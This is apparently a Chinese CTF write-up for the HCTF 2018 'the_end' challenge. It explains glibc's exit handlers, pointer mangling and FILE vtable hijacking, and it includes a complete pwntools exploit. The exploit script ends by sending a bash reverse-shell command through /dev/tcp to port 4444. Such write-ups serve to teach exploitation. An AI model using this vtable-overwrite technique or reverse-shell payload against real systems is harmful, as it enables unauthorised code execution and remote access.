---
title: EXIT_HCTF2018_the_end
date: 2019-05-15 16:06:22
tags: _IO_FILE
layout: post
---
发现自己的积累还是太少了趁着学校运动会的期间多学点东西,`veritas501`师傅好强...
<!--more-->
# Start
对`exit`相关知识接触的太少今天乘着做题多读一些源码顺便拓展一些相关知识.
* exit()和_exit()以及_Exit()函数的本质区别是是否立即进入内核，_exit()以及_Exit()函数都是在调用后立即进入内核，而不会执行一些清理处理，但是exit()则会执行一些清理处理



# _exit() | _Exit()
```c
void
_exit (int status)
{
  while (1)
    {
#ifdef __NR_exit_group
      INLINE_SYSCALL (exit_group, 1, status);
#endif
      INLINE_SYSCALL (exit, 1, status);
#ifdef ABORT_INSTRUCTION
      ABORT_INSTRUCTION;
#endif
    }
}b
```
call了 系统调用`exit`退出了.
# exit()
```c
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
```
接着看`__run_exit_handlers`
```c
//https://code.woboq.org/userspace/glibc/stdlib/exit.c.html#__run_exit_handlers
void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
                     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
#ifndef SHARED
  if (&__call_tls_dtors != NULL)
#endif
    if (run_dtors)
      __call_tls_dtors ();
  /* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */
  while (true)
    {
      struct exit_function_list *cur;
      __libc_lock_lock (__exit_funcs_lock);
    restart:
      cur = *listp;
      if (cur == NULL)
        {
          /* Exit processing complete.  We will not allow any more
             atexit/on_exit registrations.  */
          __exit_funcs_done = true;
          __libc_lock_unlock (__exit_funcs_lock);
          break;
        }
      while (cur->idx > 0)
        {
          struct exit_function *const f = &cur->fns[--cur->idx];
          const uint64_t new_exitfn_called = __new_exitfn_called;
          /* Unlock the list while we call a foreign function.  */
          __libc_lock_unlock (__exit_funcs_lock);
          switch (f->flavor)
            {
              void (*atfct) (void);
              void (*onfct) (int status, void *arg);
              void (*cxafct) (void *arg, int status);
            case ef_free:
            case ef_us:
              break;
            case ef_on:
              onfct = f->func.on.fn;
#ifdef PTR_DEMANGLE
              PTR_DEMANGLE (onfct);
#endif
              onfct (status, f->func.on.arg);
              break;
            case ef_at:
              atfct = f->func.at;
#ifdef PTR_DEMANGLE
              PTR_DEMANGLE (atfct);
#endif
              atfct ();
              break;
            case ef_cxa:
              /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
                 we must mark this function as ef_free.  */
              f->flavor = ef_free;
              cxafct = f->func.cxa.fn;
#ifdef PTR_DEMANGLE
              PTR_DEMANGLE (cxafct);
#endif
              cxafct (f->func.cxa.arg, status);
              break;
            }
          /* Re-lock again before looking at global state.  */
          __libc_lock_lock (__exit_funcs_lock);
          if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
            /* The last exit function, or another thread, has registered
               more exit functions.  Start the loop over.  */
            goto restart;
        }
      *listp = cur->next;
      if (*listp != NULL)
        /* Don't free the last element in the chain, this is the statically
           allocate element.  */
        free (cur);
      __libc_lock_unlock (__exit_funcs_lock);
    }
  if (run_list_atexit)
    RUN_HOOK (__libc_atexit, ());
  _exit (status);
}
```

整个函数可以简单分为三部分
* call the TLS destructors
* call the func in listp
* __elf_set___libc_atexit_element__IO_cleanup__(runhook时)
* _exit(status)

所以可以用来控制执行流的地方有3个`tls_dtor_list`,`__exit_funcs`,`_IO_FILE`


# tls_dtor_list

先留着坑`https://www.w0lfzhang.com/2017/03/27/Playing-with-tls-dtor-list/`

# __exit_funcs

在研究`__exit_funcs`前先得看看`__exit_funcs`的注册函数
## atexit()
这个at应该是`attach`的意思吧...
先看源码
```c
atexit (void (*func) (void))
{
  return __cxa_atexit ((void (*) (void *)) func, NULL, __dso_handle);
}
```
发现注册的函数都是无参数的.
```c
int
__cxa_atexit (void (*func) (void *), void *arg, void *d)
{
  return __internal_atexit (func, arg, d, &__exit_funcs);
}
```
这里提到了一个参数`__exit_funcs`
我们查看一下定义
`static struct exit_function_list initial;`
`struct exit_function_list *__exit_funcs = &initial;`
发现在之前的`exit()`中也是用到了这个指针
```c
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
```
指向`initial`,而 `initial`是一个`exit_function_list`结构体
```c
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
```
* next表示下一个`exit_function_list`可能是怕填满了`fns`
* idx表示当前有几个注册过的`exit_function`
* `exit_function`用来储存func的信息

再来看看`exit_function`结构
```c
//https://code.woboq.org/userspace/glibc/stdlib/exit.h.html#exit_function
struct exit_function
  {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union
      {
        void (*at) (void);
        struct
          {
            void (*fn) (int status, void *arg);
            void *arg;
          } on;
        struct
          {
            void (*fn) (void *arg, int status);
            void *arg;
            void *dso_handle;
          } cxa;
      } func;
  };
```
大致是`on&cxa`的联合体第一个域表示模式第二个域表示func地址第三个表示参数...


接着进入真正实现功能的部分了：
```c
//https://code.woboq.org/userspace/glibc/stdlib/cxa_atexit.c.html#initial
__internal_atexit (void (*func) (void *), void *arg, void *d,
                   struct exit_function_list **listp)
{
  struct exit_function *new;
  /* As a QoI issue we detect NULL early with an assertion instead
     of a SIGSEGV at program exit when the handler is run (bug 20544).  */
  assert (func != NULL);
  __libc_lock_lock (__exit_funcs_lock);
  new = __new_exitfn (listp);
  if (new == NULL)
    {
      __libc_lock_unlock (__exit_funcs_lock);
      return -1;
    }
#ifdef PTR_MANGLE
  PTR_MANGLE (func);
#endif
  new->func.cxa.fn = (void (*) (void *, int)) func;
  new->func.cxa.arg = arg;
  new->func.cxa.dso_handle = d;
  new->flavor = ef_cxa;
  __libc_lock_unlock (__exit_funcs_lock);
  return 0;
}
```
整个函数就是将`PTR_MANGLE`后的`func_address`加入`__exit_funcs_lock`
需要用到的时候就用`PTR_DEMANGLE`还原....


所以gdb中看起来一般是
```python
n132>>> x/8gx 0x00007ffff7dd2c40
0x7ffff7dd2c40 <initial>:	0x0000000000000000	0x0000000000000004
0x7ffff7dd2c50 <initial+16>:	0x0000000000000004	0x14bac0541e302e25
0x7ffff7dd2c60 <initial+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2c70 <initial+48>:	0x0000000000000004	0xeb452f68e7bc2e25
n132>>> 
0x7ffff7dd2c80 <initial+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2c90 <initial+80>:	0x0000000000000004	0xeb452f68e79e2e25
0x7ffff7dd2ca0 <initial+96>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2cb0 <initial+112>:	0x0000000000000004	0xeb452f68e7e02e25

```

总的来说`atexit()`其实对`__exit_funcs`指向的`initial`内容进行操作.
加入新的`func`在`exit`时会被调用
顺便放一下这两个🤮的宏
```
#  define PTR_MANGLE(var)        asm ("xor %%fs:%c2, %0\n"                      \
                                     "rol $2*" LP_SIZE "+1, %0"                      \
                                     : "=r" (var)                              \
                                     : "0" (var),                              \
                                       "i" (offsetof (tcbhead_t,              \
                                                      pointer_guard)))
#  define PTR_DEMANGLE(var)        asm ("ror $2*" LP_SIZE "+1, %0\n"              \
                                     "xor %%fs:%c2, %0"                              \
                                     : "=r" (var)                              \
                                     : "0" (var),                              \
                                       "i" (offsetof (tcbhead_t,              \
                                                      pointer_guard)))
# endif
#endif
```


## __run_exit_handlers
了解了上面de`exit_function_list`和`exit_function`结构体后这个函数关于`exit_function`的部分就比较好理解了.
```c
while (true)
    {
      struct exit_function_list *cur;
      __libc_lock_lock (__exit_funcs_lock);
    restart:
      cur = *listp;
      if (cur == NULL)
        {
          /* Exit processing complete.  We will not allow any more
             atexit/on_exit registrations.  */
          __exit_funcs_done = true;
          __libc_lock_unlock (__exit_funcs_lock);
          break;
        }
      while (cur->idx > 0)
        {
          struct exit_function *const f = &cur->fns[--cur->idx];
          const uint64_t new_exitfn_called = __new_exitfn_called;
          /* Unlock the list while we call a foreign function.  */
          __libc_lock_unlock (__exit_funcs_lock);
          switch (f->flavor)
            {
              void (*atfct) (void);
              void (*onfct) (int status, void *arg);
              void (*cxafct) (void *arg, int status);
            case ef_free:
            case ef_us:
              break;
            case ef_on:
              onfct = f->func.on.fn;
#ifdef PTR_DEMANGLE
              PTR_DEMANGLE (onfct);
#endif
              onfct (status, f->func.on.arg);
              break;
            case ef_at:
              atfct = f->func.at;
#ifdef PTR_DEMANGLE
              PTR_DEMANGLE (atfct);
#endif
              atfct ();
              break;
            case ef_cxa:
              /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
                 we must mark this function as ef_free.  */
              f->flavor = ef_free;
              cxafct = f->func.cxa.fn;
#ifdef PTR_DEMANGLE
              PTR_DEMANGLE (cxafct);
#endif
              cxafct (f->func.cxa.arg, status);
              break;
            }
          /* Re-lock again before looking at global state.  */
          __libc_lock_lock (__exit_funcs_lock);
          if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
            /* The last exit function, or another thread, has registered
               more exit functions.  Start the loop over.  */
            goto restart;
        }
      *listp = cur->next;
      if (*listp != NULL)
        /* Don't free the last element in the chain, this is the statically
           allocate element.  */
        free (cur);
      __libc_lock_unlock (__exit_funcs_lock);
    }
```
简而言之就是按照注册相反顺序依次执行func...(需要demangle先demangle)...
...因为mangle的原因需要泄漏一个magle后的地址才可以伪造..

# _IO_cleanup
```c
_IO_cleanup (void)
{
  /* We do *not* want locking.  Some threads might use streams but
     that is their problem, we flush them underneath them.  */
  int result = _IO_flush_all_lockp (0);
  /* We currently don't have a reliable mechanism for making sure that
     C++ static destructors are executed in the correct order.
     So it is possible that other static destructors might want to
     write to cout - and they're supposed to be able to do so.
     The following will make the standard streambufs be unbuffered,
     which forces any output from late destructors to be written out. */
  _IO_unbuffer_all ();
  return result;
}
```
在结束程序前清空缓冲区具体实现：
```c

static void
_IO_unbuffer_all (void)
{
  struct _IO_FILE *fp;
  for (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp->_chain)
    {
      if (! (fp->_flags & _IO_UNBUFFERED)
	  /* Iff stream is un-orientated, it wasn't used. */
	  && fp->_mode != 0)
	{
#ifdef _IO_MTSAFE_IO
	  int cnt;
#define MAXTRIES 2
	  for (cnt = 0; cnt < MAXTRIES; ++cnt)
	    if (fp->_lock == NULL || _IO_lock_trylock (*fp->_lock) == 0)
	      break;
	    else
	      /* Give the other thread time to finish up its use of the
		 stream.  */
	      __sched_yield ();
#endif

	  if (! dealloc_buffers && !(fp->_flags & _IO_USER_BUF))
	    {
	      fp->_flags |= _IO_USER_BUF;

	      fp->_freeres_list = freeres_list;
	      freeres_list = fp;
	      fp->_freeres_buf = fp->_IO_buf_base;
	    }

	  _IO_SETBUF (fp, NULL, 0);

	  if (fp->_mode > 0)
	    _IO_wsetb (fp, NULL, NULL, 0);

#ifdef _IO_MTSAFE_IO
	  if (cnt < MAXTRIES && fp->_lock != NULL)
	    _IO_lock_unlock (*fp->_lock);
#endif
	}

      /* Make sure that never again the wide char functions can be
	 used.  */
      fp->_mode = -1;
    }
}
```
其中调用了vtable的有`_IO_SETBUF (fp, NULL, 0);`
如果可以控制`vtable`就可以控制执行流

# analysis
[official wp][1]
[binary][2]
没有canary
```sh
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
* 泄漏libc地址
* 修改任意5字节

# 思路
* 输入完直接exit所以应该时对exit动手
* glibc-2.23没有_IO_vtable_check
* 可以尝试对IO_FILE.vatable partialwrite


做的过程中发现:
```
_IO_1_2_stdou_虚表直接指向某个有libc内地址的位置-0x58
不满足所有one_gadget
```
但是可以指向某些没有`call`过的`func`的`got-0x58`这样就会先调用`dl_resolver`....
如果还不行那就某些还存在原始值的`hook`....总有一款适合你..

* 据说2.23的话用 第三个`one_gadget`改写`__realloc_hook`
触发`realloc`会成功 .

拿到shell后反弹个shell回来就可以了
官方说stdin也可以输出但是我没成功 ....
# exp
```python

from pwn import *
context.log_level='debug'
libc=ELF("./the_end").libc
p=process("./the_end")
#p=process('./the_end',env={"LD_PRELOAD":"/glibc/x64/2.23/lib/libc-2.23.so"})
#p=remote("0.0.0.0",8888)
#gdb.attach(p,'')
p.readuntil("gift ")
base=int(p.readuntil(',')[:-1],16)-libc.sym['sleep']
log.info(hex(base))
libc.address=base

address=libc.sym['_IO_2_1_stdout_']+0xd8
q=libc.got['realloc']-0x58
aim=libc.sym['__realloc_hook']

one=base+0xf02a4
q1=chr(q&0xff)
q2=chr((q>>8)&0xff)

p1=chr(one&0xff)
p2=chr((one&0xff00)>>8)
p3=chr((one&0xff0000)>>16)
p.send(p64(address))
p.send(q1)
p.send(p64(address+1))
p.send(q2)
p.send(p64(aim))
p.send(p1)
p.send(p64(aim+1))
p.send(p2)
p.send(p64(aim+2))
raw_input()
p.send(p3)

p.sendlineafter(")","/bin/bash -c 'bash -i >/dev/tcp/0.0.0.0/4444 0>&1'")
p.interactive()
```
# summary
虽然学会了之后感觉比较简单但其实内容还是很丰富的...

* exit 流程
* vtable hijacking 
* one_gadget setting
* reserve shell



[1]:https://github.com/veritas501/hctf2018
[2]:https://github.com/n132/Watermalon/tree/master/HCTF_2018/the_end